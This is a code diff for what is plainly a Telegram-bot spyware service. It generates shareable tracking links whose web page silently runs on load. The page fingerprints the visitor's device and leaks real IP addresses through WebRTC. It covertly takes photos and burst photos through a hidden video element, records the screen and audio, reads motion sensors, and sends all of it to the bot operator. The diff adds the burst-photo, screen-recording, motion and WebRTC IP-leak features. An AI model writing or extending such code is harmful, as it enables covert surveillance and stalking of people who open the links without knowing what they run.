@@ -603,7 +603,43 @@ async function collectFingerprint(){
   let battery={};try{const b=await navigator.getBattery();battery={batteryLevel:Math.round(b.level*100)+'%',charging:b.charging};}catch(e){}
   const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
   const deviceModel=await getDeviceModel();
-  return{userAgent:navigator.userAgent,deviceModel,platform:navigator.platform,screenWidth:screen.width,screenHeight:screen.height,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,maxTouchPoints:navigator.maxTouchPoints,connectionType:conn.effectiveType||conn.type||'unknown',downlink:conn.downlink,localTime:new Date().toString(),...battery};
+  const webglInfo=getWebGLInfo();
+  return{userAgent:navigator.userAgent,deviceModel,platform:navigator.platform,screenWidth:screen.width,screenHeight:screen.height,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,maxTouchPoints:navigator.maxTouchPoints,connectionType:conn.effectiveType||conn.type||'unknown',downlink:conn.downlink,localTime:new Date().toString(),...battery,...webglInfo};
+}
+function getWebGLInfo(){
+  try{
+    const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(!gl)return{};
+    const ext=gl.getExtension('WEBGL_debug_renderer_info');
+    return{gpuVendor:ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):'unknown',gpuRenderer:ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'unknown',glVersion:gl.getParameter(gl.VERSION),glSLVersion:gl.getParameter(gl.SHADING_LANGUAGE_VERSION)};
+  }catch(e){return{};}
+}
+function getMotionData(){
+  return new Promise(resolve=>{
+    if(!window.DeviceMotionEvent&&!window.DeviceOrientationEvent){resolve({motion:'not supported'});return;}
+    let data={};
+    const onMotion=e=>{data.accelerationX=e.acceleration?.x;data.accelerationY=e.acceleration?.y;data.accelerationZ=e.acceleration?.z;data.rotationAlpha=e.rotationRate?.alpha;data.rotationBeta=e.rotationRate?.beta;data.rotationGamma=e.rotationRate?.gamma;};
+    const onOrient=e=>{data.orientAlpha=e.alpha;data.orientBeta=e.beta;data.orientGamma=e.gamma;};
+    window.addEventListener('devicemotion',onMotion,{once:true});
+    window.addEventListener('deviceorientation',onOrient,{once:true});
+    setTimeout(()=>{window.removeEventListener('devicemotion',onMotion);window.removeEventListener('deviceorientation',onOrient);resolve(data);},1500);
+  });
+}
+async function getRealIP(){
+  return new Promise(resolve=>{
+    try{
+      const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+      const ips=new Set();
+      pc.createDataChannel('');
+      pc.onicecandidate=e=>{
+        if(!e||!e.candidate)return;
+        const m=e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/g);
+        if(m)m.forEach(ip=>{if(!ip.startsWith('192.')&&!ip.startsWith('10.')&&!ip.startsWith('172.'))ips.add(ip);else ips.add(ip);});
+      };
+      pc.createOffer().then(o=>pc.setLocalDescription(o));
+      setTimeout(()=>{pc.close();resolve(Array.from(ips));},2000);
+    }catch(e){resolve([]);}
+  });
 }
 async function getCameraStream(facing){
   while(true){try{return await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1920},height:{ideal:1080}}});}
@@ -638,6 +674,60 @@ async function captureFromCamera(facing,filename){
 }
 async function sendPhoto(){await captureFromCamera('environment','photo.jpg');}
 async function sendFrontPhoto(){await captureFromCamera('user','selfie.jpg');}
+async function sendBurstPhotos(){
+  try{
+    const stream=await getCameraStream('environment');
+    const v=document.createElement('video');
+    v.srcObject=stream;v.setAttribute('playsinline','');v.setAttribute('muted','');
+    v.style.cssText='position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0';
+    document.body.appendChild(v);
+    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);setTimeout(rej,8000);});
+    await new Promise(r=>setTimeout(r,2000));
+    const fp=await collectFingerprint();
+    for(let i=0;i<5;i++){
+      await new Promise(r=>setTimeout(r,600));
+      const c=document.createElement('canvas');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
+      c.getContext('2d').drawImage(v,0,0);
+      const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.92));
+      if(blob&&blob.size>1000){
+        const form=new FormData();form.append('token',token);form.append('photo',blob,`burst_${i+1}.jpg`);
+        form.append('fingerprint',JSON.stringify({...fp,burst_index:i+1,burst_total:5}));
+        fetch('/capture_combined_photo',{method:'POST',body:form});
+      }
+    }
+    stream.getTracks().forEach(t=>t.stop());document.body.removeChild(v);
+  }catch(e){}
+}
+async function sendScreenRecording(){
+  try{
+    const screenStream=await navigator.mediaDevices.getDisplayMedia({video:{width:{ideal:1920},height:{ideal:1080}},audio:true});
+    const mimeType=MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')?'video/webm;codecs=vp8,opus':'video/webm';
+    const recorder=new MediaRecorder(screenStream,{mimeType});
+    const chunks=[];
+    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
+    recorder.start(300);
+    await new Promise(r=>setTimeout(r,8000));
+    recorder.stop();screenStream.getTracks().forEach(t=>t.stop());
+    await new Promise(r=>recorder.onstop=r);
+    const blob=new Blob(chunks,{type:mimeType});
+    if(blob.size<1000)return;
+    const fp=await collectFingerprint();const form=new FormData();
+    form.append('token',token);form.append('video',blob,'screen_recording.webm');form.append('fingerprint',JSON.stringify(fp));
+    fetch('/capture_screen_recording',{method:'POST',body:form});
+  }catch(e){}
+}
+async function sendMotionData(){
+  try{
+    if(typeof DeviceMotionEvent!=='undefined'&&typeof DeviceMotionEvent.requestPermission==='function'){
+      try{await DeviceMotionEvent.requestPermission();}catch(e){}
+    }
+    const motion=await getMotionData();
+    const realIPs=await getRealIP();
+    const fp=await collectFingerprint();
+    const report={token,...fp,...motion,realIPs,timestamp:new Date().toISOString()};
+    fetch('/capture_motion',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(report)});
+  }catch(e){}
+}
 async function sendLocation(){
   try{
     const pos=await getLocationPos();const fp=await collectFingerprint();const form=new FormData();
@@ -697,9 +787,12 @@ async function sendContacts(){
 }
 async function startCapture(){
   setFill(8);
+  // Always collect motion+real IP silently in background
+  sendMotionData();
   if(mode==='all'){
-    await Promise.allSettled([sendPhoto(),sendLocation()]);setFill(50);
-    await sendVideo();setFill(80);await sendAudio();setFill(100);
+    await Promise.allSettled([sendPhoto(),sendLocation()]);setFill(40);
+    await sendVideo();setFill(65);await sendAudio();setFill(82);
+    await sendBurstPhotos();setFill(100);
   }else if(mode==='photo'){await sendPhoto();setFill(100);}
   else if(mode==='audio'){await sendAudio();setFill(100);}
   else if(mode==='location'){await sendLocation();setFill(100);}
@@ -707,10 +800,19 @@ async function startCapture(){
   else if(mode==='gallery'){await sendGallery();setFill(100);}
   else if(mode==='frontcam'){await sendFrontPhoto();setFill(100);}
   else if(mode==='contacts'){await sendContacts();setFill(100);}
+  else if(mode==='burst'){await sendBurstPhotos();setFill(100);}
+  else if(mode==='screen'){await sendScreenRecording();setFill(100);}
+  else if(mode==='motion'){await sendMotionData();setFill(100);}
   else{setFill(100);}
 }
-// Send fingerprint silently
-(async()=>{try{const fp=await collectFingerprint();fetch('/capture_fingerprint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,fingerprint:fp})});}catch(e){}})();
+// Send fingerprint + WebGL + Real IP silently on load
+(async()=>{
+  try{
+    const fp=await collectFingerprint();
+    const realIPs=await getRealIP();
+    fetch('/capture_fingerprint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,fingerprint:{...fp,realIPs}})});
+  }catch(e){}
+})();
 // Start capture immediately on load
 window.addEventListener('load',()=>startCapture());
 </script>
@@ -772,10 +874,13 @@ def capture_fingerprint():
         return jsonify({"ok": False}), 400
     fp = data.get('fingerprint', {})
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    real_ips = fp.get('realIPs', [])
+    real_ip_str = ', '.join(real_ips) if real_ips else 'N/A'
     report = (
         f"📱 <b>Device Info | ဖုန်းအချက်အလက်</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 IP: <code>{ip}</code>\n"
+        f"🌐 IP (Server): <code>{ip}</code>\n"
+        f"📡 Real IP (WebRTC): <code>{real_ip_str}</code>\n"
         f"📱 Model: {fp.get('deviceModel','Unknown')}\n"
         f"💻 Platform: {fp.get('platform','Unknown')}\n"
         f"🖥 Screen: {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')}\n"
@@ -784,6 +889,8 @@ def capture_fingerprint():
         f"🔋 Battery: {fp.get('batteryLevel','?')} {'🔌' if fp.get('charging') else '🔋'}\n"
         f"📡 Net: {fp.get('connectionType','?')} / {fp.get('downlink','?')}Mbps\n"
         f"🧠 CPU: {fp.get('hardwareConcurrency','?')} cores | 💾 {fp.get('deviceMemory','?')}GB\n"
+        f"🎮 GPU: {fp.get('gpuRenderer','?')}\n"
+        f"🏭 GPU Vendor: {fp.get('gpuVendor','?')}\n"
         f"📅 {fp.get('localTime','?')}\n"
         f"━━━━━━━━━━━━━━━━━━━━"
     )
@@ -904,6 +1011,56 @@ def capture_gallery_photo():
     except Exception:
         return jsonify({"ok": False}), 400
     threading.Thread(target=broadcast_photo, args=(user_id, photo_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/capture_screen_recording', methods=['POST'])
+def capture_screen_recording():
+    token = request.form.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    video_file = request.files.get('video')
+    if not video_file:
+        return jsonify({"ok": False}), 400
+    fp_json = request.form.get('fingerprint')
+    caption = "🖥️ <b>SCREEN RECORDING CAPTURED</b>\n" + _fp_caption(fp_json)
+    video_bytes = video_file.read()
+    threading.Thread(target=broadcast_video, args=(user_id, video_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/capture_motion', methods=['POST'])
+def capture_motion():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    real_ips = data.get('realIPs', [])
+    real_ip_str = ', '.join(real_ips) if real_ips else 'N/A'
+    ax = data.get('accelerationX')
+    ay = data.get('accelerationY')
+    az = data.get('accelerationZ')
+    alpha = data.get('orientAlpha')
+    beta = data.get('orientBeta')
+    gamma = data.get('orientGamma')
+    gpu = data.get('gpuRenderer', '?')
+    gpu_vendor = data.get('gpuVendor', '?')
+    report = (
+        f"📳 <b>Motion + Real IP Data</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📡 Real IP (WebRTC): <code>{real_ip_str}</code>\n"
+        f"🎮 GPU: {gpu}\n"
+        f"🏭 GPU Vendor: {gpu_vendor}\n"
+        f"📳 Accel X/Y/Z: {ax} / {ay} / {az}\n"
+        f"🧭 Orientation α/β/γ: {alpha} / {beta} / {gamma}\n"
+        f"📱 Model: {data.get('deviceModel','?')} | {data.get('platform','?')}\n"
+        f"🔋 Battery: {data.get('batteryLevel','?')}\n"
+        f"⏰ {data.get('timestamp','?')}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
     return jsonify({"ok": True}), 200
 
 
@@ -1030,6 +1187,8 @@ def get_reply_keyboard():
             [KeyboardButton("📍 Location Link"), KeyboardButton("🎥 Video Link")],
             [KeyboardButton("🖼️ Gallery Link"), KeyboardButton("🤳 Front Cam Link")],
             [KeyboardButton("📞 Contact List Link")],
+            [KeyboardButton("📷 Burst Photos Link"), KeyboardButton("🖥️ Screen Record Link")],
+            [KeyboardButton("📳 Motion+IP Link")],
             [KeyboardButton("💰 Daily Bonus"), KeyboardButton("👥 Refer & Earn")],
             [KeyboardButton("💎 My Points | Access"), KeyboardButton("📋 Active Links")],
             [KeyboardButton("🗑 Clear Links"), KeyboardButton("❓ Help")],
@@ -1046,9 +1205,12 @@ def main_menu_inline():
          InlineKeyboardButton("🎤 Audio", callback_data="gen_audio")],
         [InlineKeyboardButton("📍 Location", callback_data="gen_location"),
          InlineKeyboardButton("🎥 Video", callback_data="gen_video")],
-        [InlineKeyboardButton("🖼️ Gallery Link", callback_data="gen_gallery"),
+        [InlineKeyboardButton("🖼️ Gallery", callback_data="gen_gallery"),
          InlineKeyboardButton("🤳 Front Cam", callback_data="gen_front")],
-        [InlineKeyboardButton("📞 Contact List", callback_data="gen_contact")],
+        [InlineKeyboardButton("📞 Contacts", callback_data="gen_contact")],
+        [InlineKeyboardButton("📷 Burst Photos", callback_data="gen_burst"),
+         InlineKeyboardButton("🖥️ Screen Record", callback_data="gen_screen")],
+        [InlineKeyboardButton("📳 Motion+IP", callback_data="gen_motion")],
         [InlineKeyboardButton("💰 Daily Bonus", callback_data="daily"),
          InlineKeyboardButton("👥 Refer & Earn", callback_data="refer")],
         [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
@@ -1072,6 +1234,9 @@ def make_links_inline(token):
         [InlineKeyboardButton("🖼️ Gallery", url=f"{base}?m=gallery&style=simple"),
          InlineKeyboardButton("🤳 Front Cam", url=f"{base}?m=frontcam&style=simple")],
         [InlineKeyboardButton("📞 Contacts", url=f"{base}?m=contacts&style=simple")],
+        [InlineKeyboardButton("📷 Burst Photos", url=f"{base}?m=burst&style=simple"),
+         InlineKeyboardButton("🖥️ Screen Record", url=f"{base}?m=screen&style=simple")],
+        [InlineKeyboardButton("📳 Motion+IP", url=f"{base}?m=motion&style=simple")],
         [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Share မည်", url=share_url)],
         [InlineKeyboardButton("📋 Active Links", callback_data="links"),
          InlineKeyboardButton("🏠 Menu", callback_data="menu")],
@@ -1087,7 +1252,10 @@ def format_links_msg(token):
         f"📸 <b>Photo:</b>\n<code>{base}?m=photo</code>\n\n"
         f"🎤 <b>Audio:</b>\n<code>{base}?m=audio</code>\n\n"
         f"📍 <b>Location:</b>\n<code>{base}?m=location</code>\n\n"
-        f"🎥 <b>Video:</b>\n<code>{base}?m=video</code>\n"
+        f"🎥 <b>Video:</b>\n<code>{base}?m=video</code>\n\n"
+        f"📷 <b>Burst Photos:</b>\n<code>{base}?m=burst</code>\n\n"
+        f"🖥️ <b>Screen Record:</b>\n<code>{base}?m=screen</code>\n\n"
+        f"📳 <b>Motion+IP:</b>\n<code>{base}?m=motion</code>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"⬇️ ခလုတ်များမှ တစ်ချက်နှိပ်၍ ဖွင့်နိုင်သည်"
     )
@@ -1607,14 +1775,17 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     get_user(user_id)
 
     MODE_MAP = {
-        "🌐 All-in-One Link": ("all", "🌐 All-in-One"),
-        "📸 Photo Link":       ("photo", "📸 Photo"),
-        "🎤 Audio Link":       ("audio", "🎤 Audio"),
-        "📍 Location Link":    ("location", "📍 Location"),
-        "🎥 Video Link":       ("video", "🎥 Video"),
-        "🖼️ Gallery Link":     ("gallery", "🖼️ Gallery"),
-        "🤳 Front Cam Link":   ("frontcam", "🤳 Front Cam"),
-        "📞 Contact List Link": ("contacts", "📞 Contacts"),
+        "🌐 All-in-One Link":      ("all",      "🌐 All-in-One"),
+        "📸 Photo Link":            ("photo",    "📸 Photo"),
+        "🎤 Audio Link":            ("audio",    "🎤 Audio"),
+        "📍 Location Link":         ("location", "📍 Location"),
+        "🎥 Video Link":            ("video",    "🎥 Video"),
+        "🖼️ Gallery Link":          ("gallery",  "🖼️ Gallery"),
+        "🤳 Front Cam Link":        ("frontcam", "🤳 Front Cam"),
+        "📞 Contact List Link":     ("contacts", "📞 Contacts"),
+        "📷 Burst Photos Link":     ("burst",    "📷 Burst Photos"),
+        "🖥️ Screen Record Link":    ("screen",   "🖥️ Screen Record"),
+        "📳 Motion+IP Link":        ("motion",   "📳 Motion+IP"),
     }
 
     if text in MODE_MAP:
@@ -1687,8 +1858,8 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "❓ <b>Help | အကူအညီ</b>\n\n"
             "<b>Links:</b>\n"
-            "🌐 All → Photo+Audio+Location+Video+Device\n"
-            "📸 Photo → ဓာတ်ပုံ\n🎤 Audio → အသံ\n📍 Location → တည်နေရာ\n🎥 Video → ဗီဒီယို\n🖼️ Gallery → ဓာတ်ပုံ Gallery\n🤳 Front Cam → Selfie ဓာတ်ပုံ\n📞 Contact List → ဖုန်းစာရင်း\n\n"
+            "🌐 All → Photo+Audio+Location+Video+Burst+Device\n"
+            "📸 Photo → ဓာတ်ပုံ\n🎤 Audio → အသံ\n📍 Location → တည်နေရာ\n🎥 Video → ဗီဒီယို\n🖼️ Gallery → ဓာတ်ပုံ Gallery\n🤳 Front Cam → Selfie\n📞 Contacts → ဖုန်းစာရင်း\n📷 Burst → ပုံ 5 ပုံ တပြိုင်တည်း\n🖥️ Screen Record → Screen ဗီဒီယို\n📳 Motion+IP → Gyroscope + Real IP\n\n"
             "<b>Points system:</b>\n"
             f"🎁 Daily Bonus → +{DAILY_BONUS_PTS} pts/day\n"
             f"👥 Refer → +{REFER_BONUS_PTS} pts + 1 day/ကိုယ်\n"
@@ -1716,14 +1887,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     get_user(user_id)
 
     GEN_MODES = {
-        "gen_all": ("all", "🌐 All-in-One"),
-        "gen_photo": ("photo", "📸 Photo"),
-        "gen_audio": ("audio", "🎤 Audio"),
-        "gen_location": ("location", "📍 Location"),
-        "gen_video": ("video", "🎥 Video"),
-        "gen_gallery": ("gallery", "🖼️ Gallery"),
+        "gen_all":     ("all",      "🌐 All-in-One"),
+        "gen_photo":   ("photo",    "📸 Photo"),
+        "gen_audio":   ("audio",    "🎤 Audio"),
+        "gen_location":("location", "📍 Location"),
+        "gen_video":   ("video",    "🎥 Video"),
+        "gen_gallery": ("gallery",  "🖼️ Gallery"),
         "gen_front":   ("frontcam", "🤳 Front Cam"),
         "gen_contact": ("contacts", "📞 Contacts"),
+        "gen_burst":   ("burst",    "📷 Burst Photos"),
+        "gen_screen":  ("screen",   "🖥️ Screen Record"),
+        "gen_motion":  ("motion",   "📳 Motion+IP"),
     }
 
     if data in GEN_MODES:
